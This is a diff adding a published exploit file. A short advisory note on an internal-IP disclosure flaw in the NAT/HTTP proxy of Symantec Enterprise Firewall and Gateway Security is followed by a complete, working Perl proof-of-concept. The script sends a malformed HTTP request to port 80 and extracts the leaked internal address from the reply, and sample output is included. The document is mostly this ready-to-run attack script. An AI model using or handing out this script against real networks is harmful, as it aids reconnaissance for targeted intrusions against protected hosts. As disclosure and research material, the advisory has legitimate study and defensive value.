@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/17936/info
+
+Symantec Enterprise Firewall and Gateway Security products are prone to an information-disclosure weakness. 
+
+The vendor has reported that the NAT/HTTP proxy component of the products may reveal the internal IP addresses of protected computers. 
+
+An attacker may use this information to carry out targeted attacks against a potentially vulnerable host.
+
+#!/usr/bin/perl
+# [title] raptor firewall internal IP disclosure 'exploit'
+# [mailto] research [at] sec-consult [dot} com
+#
+# sk0L@b4byl0n:~/home/sk0L> perl raptor-nat.pl behind.raptor.com
+# waiting for timeout (this can take about 1 min.)
+# behind.raptor.com: 10.238.94.67
+
+use IO::Socket;
+
+$| = 1;
+
+$host = $ARGV[0] or die "$0 <host>\n";
+
+$request = "getXXX/XXX HTTP/1.0\n\n";
+
+my $sock = new IO::Socket::INET (
+                 PeerAddr => $host,
+                 PeerPort => 80,
+                 Proto => 'tcp',
+);
+
+die "could not open socket: $!\n" unless $sock;
+
+print $sock $request;
+
+print "waiting for timeout (this can take about 1 min.)\n";
+
+while (<$sock>) {
+                 if ($_ =~ /http:\/\/(\d+\.\d+\.\d+\.\d+)XXX/) {
+                                 $ip = $1;
+                 }
+}
+
+if (defined($ip)) {
+                 print "$host: $ip\n";
+} else {
+                 print "failed.\n";
+}
+
+close($sock);
